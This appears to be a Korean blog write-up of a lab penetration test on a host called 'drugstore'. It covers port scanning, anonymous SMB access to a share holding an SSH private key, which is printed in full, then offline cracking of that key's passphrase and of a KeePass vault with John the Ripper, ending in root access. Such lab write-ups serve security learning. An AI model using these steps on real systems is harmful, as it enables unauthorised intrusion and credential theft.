---
title: '[BHPT] Drugstore'
layout: post
date: 2026-11-09 12:00:00 +0900
---

# 3.drugstore 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | drugstore | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 02:45 EST
Nmap scan report for TARGET_IP
Host is up (0.017s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
34099/tcp open  unknown
39555/tcp open  unknown
45451/tcp open  unknown
47235/tcp open  unknown
48355/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```
포트 스캔 결과 포트 21,22,111,139,445,2049,34099,39555,45451,47451,47235,48355이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 21,22,111,139,445,2049,34099,39555,45451,47451,47235,48355 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 03:01 EST
Nmap scan report for TARGET_IP
Host is up (0.016s latency).
Not shown: 1 closed tcp port (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:ATTACKER_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7b:b1:f9:1d:f3:36:e8:d7:42:58:22:46:56:cd:31:e9 (ECDSA)
|_  256 3d:80:30:af:21:56:74:7f:74:0b:4c:50:53:64:98:17 (ED25519)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34099/tcp   mountd
|   100005  1,2,3      36612/udp   mountd
|   100005  1,2,3      42646/udp6  mountd
|_  100005  1,2,3      51433/tcp6  mountd
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
34099/tcp open  mountd      1-3 (RPC #100005)
39555/tcp open  status      1 (RPC #100024)
45451/tcp open  nlockmgr    1-4 (RPC #100021)
47235/tcp open  mountd      1-3 (RPC #100005)
48355/tcp open  mountd      1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -43s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-06T08:00:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.85 seconds
```

스캔을 통해 삼바 발견했으며, smb 스캔을 통해 samba-share 쉐어에 Null Session 접근이 가능한것을 확인했음
```
└─$ netexec smb -u '' -p '' --shares TARGET_IP 
.
.
.
SMB         TARGET_IP  445    IP-172-31-166-55 [*] Unix - Samba (name:IP-172-31-166-55) (domain:ap-northeast-2.compute.internal) (signing:False) (SMBv1:False)
SMB         TARGET_IP  445    IP-172-31-166-55 [+] ap-northeast-2.compute.internal\: 
SMB         TARGET_IP  445    IP-172-31-166-55 [*] Enumerated shares
SMB         TARGET_IP  445    IP-172-31-166-55 Share           Permissions     Remark
SMB         TARGET_IP  445    IP-172-31-166-55 -----           -----------     ------
SMB         TARGET_IP  445    IP-172-31-166-55 print$                          Printer Drivers
SMB         TARGET_IP  445    IP-172-31-166-55 samba-share     READ            
SMB         TARGET_IP  445    IP-172-31-166-55 IPC$                            IPC Service (ip-172-31-166-55 server (Samba, Ubuntu))
```

```
└─$ smbmap -H TARGET_IP                                                                   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                         [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                              [/] Authenticating...                                                                                  [-] Authenticating...                                                                                  [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[\] Enumerating shares...                                                                              [|] Enumerating shares...                                                                              [/] Enumerating shares...                                                                              [-] Enumerating shares...                                                                              [\] Enumerating shares...                                                                                                                                                                                  
[+] IP: TARGET_IP:445      Name: TARGET_IP            Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        samba-share                                             READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (ip-172-31-166-55 server (Samba, Ubuntu))
```

```
└─$ enum4linux -a TARGET_IP
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Dec  6 03:15:18 2025
.
.
.

 ================================( Share Enumeration on TARGET_IP )================================                                                                                                      
                                                                                                       
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                  

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        samba-share     Disk      
        IPC$            IPC       IPC Service (ip-172-31-166-55 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server TARGET_IP (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```


samba-share 쉐어에 계정없이 접근 성공했으며, SSH 비밀키 다운로드 성공.
```
└─$ smbclient \\\\TARGET_IP\\samba-share -U 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct  6 22:29:33 2023
  ..                                  D        0  Sat Dec  6 02:36:30 2025
  architect_id_rsa                    N     3414  Fri Oct  6 22:29:33 2023

                7941576 blocks of size 1024. 5595212 blocks available
smb: \> get architect_id_rsa
getting file \architect_id_rsa of size 3414 as architect_id_rsa (74.1 KiloBytes/sec) (average 74.1 KiloBytes/sec)
```
```
└─$ cat architect_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
2qCA==
-----END OPENSSH PRIVATE KEY-----
```

### 초기 침투

해당 SSH 비밀키에는 passphrase가 걸려있어서 ssh2john 툴을 사용해 비밀번호 크래킹.
```
┌──(kali㉿kali)-[~/Desktop/drugstore]
└─$ ssh2john architect_id_rsa > architect_id_rsa.hash

┌──(kali㉿kali)-[~/Desktop/drugstore]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt architect_id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED_PASSWORD]           (architect_id_rsa)     
1g 0:00:00:18 DONE (2025-12-06 03:28) 0.05316g/s 15.31p/s 15.31c/s 15.31C/s barcelona..brenda
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

SSH -i 옵션에 키를 넣어 접근하여 passphrase에 크래킹했던 비밀번호를 입력하여 초기 침투 성공.
```
└─$ sudo ssh architect@TARGET_IP -i architect_id_rsa
[sudo] password for kali: 
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ED25519 key fingerprint is SHA256:e5UAaFcMMVpKmpOUcUVYuZiFhLrjWthlVw8ERtxab6E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'TARGET_IP' (ED25519) to the list of known hosts.
Enter passphrase for key 'architect_id_rsa': 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1025-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec  9 11:34:02 UTC 2025

  System load:  0.0               Processes:             125
  Usage of /:   29.5% of 7.57GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for ens5: TARGET_IP
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

129 updates can be applied immediately.
75 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

architect@ip-172-31-166-55:~$ id
uid=1001(architect) gid=1001(architect) groups=1001(architect)
```

### 권한 상승

침투한 유저의 홈 디렉토리에서 .kdbx 확장자를 가진 파일 입수
```
architect@ip-172-31-166-55:~$ ls -al
total 32
drwxr-x--- 4 architect architect 4096 Dec  9 11:34 .
drwxr-xr-x 4 root      root      4096 Oct  7  2023 ..
-rw-r--r-- 1 architect architect  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 architect architect 3771 Jan  6  2022 .bashrc
drwx------ 2 architect architect 4096 Dec  9 11:34 .cache
-rw-r--r-- 1 architect architect  807 Jan  6  2022 .profile
drwx------ 2 architect architect 4096 Oct  7  2023 .ssh
-r--r--rwx 1 root      root      1422 Oct  7  2023 architect-vault.kdbx
```
```
scp -i architect_id_rsa architect@TARGET_IP:/home/architect/architect-vault.kdbx

└─$ sudo scp -i architect_id_rsa architect@TARGET_IP:/home/architect/architect-vault.kdbx .
[sudo] password for kali: 
Enter passphrase for key 'architect_id_rsa': 
architect-vault.kdbx                                                                                                                                                             100% 1422    11.7KB/s   00:00 
```

구글링 해보니 KeePass 비밀번호 관리자에서 사용되는 암호화된 데이터베이스 파일 형식인것을 확인함.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-drugstore/image-2.png)

keepassxc를 설치하여 실행 후, 입수 한 파일 로드하면 비밀번호가 필요한것을 확인했음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-drugstore/image.png)

keepass2john을 통해 크래킹 가능한 해시로 변환. 그 뒤 johntheripper를 통해 해시크래킹 진행.
```
┌──(kali㉿kali)-[~/Desktop/drugstore]
└─$ keepass2john architect-vault.kdbx > keepassbrute.hash

┌──(kali㉿kali)-[~/Desktop/drugstore]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt keepassbrute.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 10000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED_PASSWORD]           (architect-vault)     
1g 0:00:00:00 DONE (2025-12-09 07:23) 1.123g/s 539.3p/s 539.3c/s 539.3C/s linda..marie
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

크래킹한 비밀번호를 입력하여 root 비밀번호 입수 후, root로 로그인 하여 권한 상승 성공.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-drugstore/image-1.png)

```
architect@ip-172-31-166-55:~$ su
Password: 
root@ip-172-31-166-55:/home/architect# id
uid=0(root) gid=0(root) groups=0(root)
```

